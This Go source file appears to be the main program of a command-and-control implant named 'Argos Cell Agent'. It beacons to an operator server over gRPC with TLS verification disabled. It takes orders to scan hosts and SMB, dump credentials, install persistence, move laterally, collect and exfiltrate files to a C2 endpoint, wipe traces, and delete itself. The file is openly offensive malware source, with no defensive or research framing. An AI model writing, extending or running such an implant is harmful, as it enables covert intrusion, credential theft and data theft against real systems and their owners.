// agents/cell/main.go
// Argos Cell Agent v2.1 — Full gRPC agent with recon, exploit, and post modules.

package main

import (
	"context"
	"crypto/tls"
	"fmt"
	"log"
	"net"
	"os"
	"runtime"
	"time"

	pb "github.com/argos/shared/proto"
	"github.com/argos/cell/post"
	"github.com/argos/cell/recon"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
	"google.golang.org/grpc/credentials/insecure"
)

const (
	defaultC2Host     = "127.0.0.1"
	defaultC2Port     = "50051"
	agentVersion      = "2.1.0-cell"
	maxBackoff        = 5 * time.Minute
	initialBackoff    = 5 * time.Second
)

type Cell struct {
	agentID    string
	hostname   string
	outboundIP string
	c2Host     string
	c2Port     string
	useTLS     bool
	interval   int
	client     pb.AgentC2Client
	conn       *grpc.ClientConn
	cancel     context.CancelFunc
}

func main() {
	log.SetFlags(log.Ltime | log.Lshortfile)

	c := &Cell{
		c2Host:   getEnvOrDefault("ARGOS_C2_HOST", defaultC2Host),
		c2Port:   getEnvOrDefault("ARGOS_C2_PORT", defaultC2Port),
		useTLS:   getEnvOrDefault("ARGOS_TLS", "false") == "true",
		hostname: getHostname(),
	}
	c.outboundIP = getOutboundIP()
	c.agentID = fmt.Sprintf("cell-%s-%x", c.hostname, time.Now().Unix())[:16]

	log.Printf("[Cell] Starting %s | OS: %s/%s | IP: %s", c.agentID[:8], runtime.GOOS, runtime.GOARCH, c.outboundIP)
	c.run()
}

func (c *Cell) run() {
	backoff := initialBackoff
	for {
		ctx, cancel := context.WithCancel(context.Background())
		c.cancel = cancel

		if err := c.connect(ctx); err != nil {
			log.Printf("[Cell] Connection failed: %v. Retry in %v", err, backoff)
			cancel()
			select {
			case <-time.After(backoff):
			case <-ctx.Done():
				return
			}
			backoff = time.Duration(float64(backoff) * 1.5)
			if backoff > maxBackoff {
				backoff = maxBackoff
			}
			continue
		}
		backoff = initialBackoff
		cancel()
	}
}

func (c *Cell) connect(ctx context.Context) error {
	addr := fmt.Sprintf("%s:%s", c.c2Host, c.c2Port)
	log.Printf("[Cell] Connecting to C2: %s (TLS=%v)", addr, c.useTLS)

	var opts []grpc.DialOption
	if c.useTLS {
		opts = append(opts, grpc.WithTransportCredentials(credentials.NewTLS(&tls.Config{InsecureSkipVerify: true})))
	} else {
		opts = append(opts, grpc.WithTransportCredentials(insecure.NewCredentials()))
	}
	opts = append(opts, grpc.WithBlock(), grpc.WithTimeout(10*time.Second))

	conn, err := grpc.DialContext(ctx, addr, opts...)
	if err != nil {
		return fmt.Errorf("dial: %w", err)
	}
	defer conn.Close()
	c.conn = conn
	c.client = pb.NewAgentC2Client(conn)

	// Register with Director
	if err := c.register(ctx); err != nil {
		return fmt.Errorf("register: %w", err)
	}

	// Main control loop (Beacon stream)
	return c.controlLoop(ctx)
}

func (c *Cell) register(ctx context.Context) error {
	resp, err := c.client.Register(ctx, &pb.AgentInfo{
		AgentId:  c.agentID,
		Hostname: c.hostname,
		Os:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		Ip:       c.outboundIP,
		Version:  agentVersion,
	})
	if err != nil {
		return err
	}
	c.interval = int(resp.BeaconIntervalSec)
	log.Printf("[Cell] Registered. Mission: %s | Beacon: %ds | Profile: %d",
		resp.MissionId, c.interval, resp.Profile)
	return nil
}

func (c *Cell) controlLoop(ctx context.Context) error {
	stream, err := c.client.Beacon(ctx)
	if err != nil {
		return fmt.Errorf("beacon stream: %w", err)
	}

	// Send goroutine — heartbeats + scan/exploit results
	go func() {
		ticker := time.NewTicker(time.Duration(c.interval) * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
			hb := &pb.AgentEvent{
				AgentId: c.agentID,
				Type:    pb.EventType_HEARTBEAT,
			}
			hb.Event = &pb.AgentEvent_Hb{
				Hb: &pb.Heartbeat{
					CpuUsage: getCPUUsage(),
					MemUsage: getMemUsage(),
				},
			}
			if err := stream.Send(hb); err != nil {
					log.Printf("[Cell] Heartbeat send error: %v", err)
					return
				}
			}
		}
	}()

	// Receive loop — commands from Director
	for {
		cmd, err := stream.Recv()
		if err != nil {
			return fmt.Errorf("stream recv: %w", err)
		}
		c.dispatchCommand(ctx, cmd, stream)
	}
}

func (c *Cell) dispatchCommand(ctx context.Context, cmd *pb.DirectorCommand, stream pb.AgentC2_BeaconClient) {
	log.Printf("[Cell] Cmd received: type=%d id=%s", cmd.Type, cmd.CommandId)

	switch cmd.Type {
	case pb.CommandType_SCAN:
		sc := cmd.GetScanCmd()
		if sc == nil || len(sc.Targets) == 0 {
			log.Printf("[Cell] Scan command missing targets")
			return
		}
		result := c.executeScan(sc)
		c.sendScanResult(stream, sc.Targets[0], result)

	case pb.CommandType_EXPLOIT:
		result := c.executeExploit(cmd.GetExploitCmd())
		c.sendExploitResult(stream, result)

	case pb.CommandType_PERSIST:
		res := post.InstallPersistence()
		if res.Error != "" {
			log.Printf("[Cell] Persist error: %v", res.Error)
		} else {
			log.Printf("[Cell] Persistence installed: %v", res.Method)
		}

	case pb.CommandType_SLEEP:
		sleepCmd := cmd.GetSleepCmd()
		dur := time.Duration(sleepCmd.DurationSec) * time.Second
		log.Printf("[Cell] Sleeping %v...", dur)
		c.interval = int(sleepCmd.DurationSec)

	case pb.CommandType_SELF_DESTRUCT:
		log.Printf("[Cell] Self-destructing...")
		os.Remove(os.Args[0])
		os.Exit(0)

	case pb.CommandType_DEPLOY_MODULE:
		deploy := cmd.GetDeployCmd()
		log.Printf("[Cell] Module deploy requested: %s", deploy.ModuleName)

	case pb.CommandType_PIVOT:
		pivot := cmd.GetPivotCmd()
		cred := &post.Credential{Username: "current", Type: "existing"}
		r := post.MoveLaterally(pivot.TargetNetwork, 0, cred, pivot.Method)
		if r.Success {
			log.Printf("[Cell] Lateral move OK: %s -> %s", r.Method, r.TargetHost)
			c.sendLateralResult(stream, &r)
		} else {
			log.Printf("[Cell] Lateral move failed: %s", r.Error)
		}

	case pb.CommandType_EXFIL:
		exfilCmd := cmd.GetExfilCmd()
		cfg := post.ExfilConfig{
			C2Endpoint: exfilCmd.C2Endpoint,
			Method:     "http",
			MaxSize:    50 * 1024 * 1024,
		}
		r := post.CollectAndExfil(cfg)
		if r.Success {
			log.Printf("[Cell] Exfil OK: %d files, %d bytes", r.FilesSent, r.TotalBytes)
		} else {
			log.Printf("[Cell] Exfil error: %s", r.Error)
		}

	case pb.CommandType_CLEANUP:
		r := post.Cleanup()
		log.Printf("[Cell] Cleanup: %v actions taken", len(r.ActionsTaken))
		if cmd.GetCleanupCmd().SelfDelete {
			os.Remove(os.Args[0])
			os.Exit(0)
		}
	}
}

// ─── Recon ──────────────────────────────────────────────────────

func (c *Cell) executeScan(sc *pb.ScanCommand) *recon.ScanResult {
	target := "127.0.0.1"
	if len(sc.Targets) > 0 {
		target = sc.Targets[0]
	}
	log.Printf("[Cell] Scanning %s...", target)

	ports := recon.GetTopPorts()
	if len(sc.Ports) > 0 {
		ports = make([]int, len(sc.Ports))
		for i, p := range sc.Ports {
			ports[i] = int(p)
		}
	}

	ps := recon.NewPortScanner(2000, 20)
	sr := ps.ScanPorts(target, ports)

	// Deep fingerprint on open ports
	ps.DeepScan(&sr)

	// SMB check if 445 open
	for _, p := range sr.OpenPorts {
		if p == 445 {
			smb := recon.CheckSMB(target, 2000)
			if smb.IsOpen && sr.Services == nil {
				sr.Services = map[int]string{}
			}
			if smb.IsOpen && smb.OSVersion != "" {
				sr.Services[445] = "smb (" + smb.OSVersion + ")"
			}
		}
	}
	return &sr
}

func (c *Cell) sendScanResult(stream pb.AgentC2_BeaconClient, target string, result *recon.ScanResult) {
	services := make([]*pb.ServiceInfo, 0, len(result.OpenPorts))
	for _, port := range result.OpenPorts {
		svcName := "unknown"
		banner := ""
		version := ""
		if result.Fingerprints != nil {
			if fp, ok := result.Fingerprints[port]; ok {
				svcName = fp.Name
				banner = fp.Banner
				version = fp.Version
			}
		}
		if result.Services != nil {
			if name, ok := result.Services[port]; ok && svcName == "unknown" {
				svcName = name
			}
		}
		services = append(services, &pb.ServiceInfo{
			Port:    uint32(port),
			Name:    svcName,
			Banner:  banner,
			Version: version,
		})
	}
	event := &pb.AgentEvent{
		AgentId: c.agentID,
		Type:    pb.EventType_SCAN_RESULT,
	}
	event.Event = &pb.AgentEvent_Scan{
		Scan: &pb.ScanResult{
			TargetIp: target,
			Services: services,
		},
	}
	if err := stream.Send(event); err != nil {
		log.Printf("[Cell] SendScanResult error: %v", err)
	}
}

// ─── Exploit ────────────────────────────────────────────────────

func (c *Cell) executeExploit(ec *pb.ExploitCommand) *pb.ExploitResult {
	log.Printf("[Cell] Exec exploit: %s on %s:%d", ec.Technique, ec.TargetHost, ec.TargetPort)
	result := &pb.ExploitResult{
		CveOrTechnique: ec.Technique,
		Success:        false,
		Error:          "not implemented in cell agent — use MSF RPC",
	}
	// Credential dump (if post module available)
	if creds := post.DumpCredentials(); creds.Success {
		log.Printf("[Cell] Post-exploit: %d creds dumped", len(creds.Creds))
		result.Output = fmt.Sprintf("%d credentials dumped", len(creds.Creds))
	}
	return result
}

func (c *Cell) sendExploitResult(stream pb.AgentC2_BeaconClient, result *pb.ExploitResult) {
	event := &pb.AgentEvent{
		AgentId: c.agentID,
		Type:    pb.EventType_EXPLOIT_RESULT,
	}
	event.Event = &pb.AgentEvent_Exploit{Exploit: result}
	if err := stream.Send(event); err != nil {
		log.Printf("[Cell] SendExploitResult error: %v", err)
	}
}

// ─── Helpers ────────────────────────────────────────────────────

func (c *Cell) sendLateralResult(stream pb.AgentC2_BeaconClient, r *post.LateralResult) {
	event := &pb.AgentEvent{
		AgentId: c.agentID,
		Type:    pb.EventType_EXPLOIT_RESULT,
	}
	event.Event = &pb.AgentEvent_Exploit{
		Exploit: &pb.ExploitResult{
			CveOrTechnique: fmt.Sprintf("lateral_%s", r.Method),
			Success:        r.Success,
			Output:         r.Output,
			Error:          r.Error,
		},
	}
	if err := stream.Send(event); err != nil {
		log.Printf("[Cell] SendLateralResult error: %v", err)
	}
}

func getHostname() string {
	h, _ := os.Hostname()
	if h == "" {
		return "unknown"
	}
	return h
}

func getOutboundIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "127.0.0.1"
	}
	defer conn.Close()
	return conn.LocalAddr().(*net.UDPAddr).IP.String()
}

func getEnvOrDefault(key, fallback string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return fallback
}

func getCPUUsage() float32 { return 0.0 }
func getMemUsage() float32 { return 0.0 }
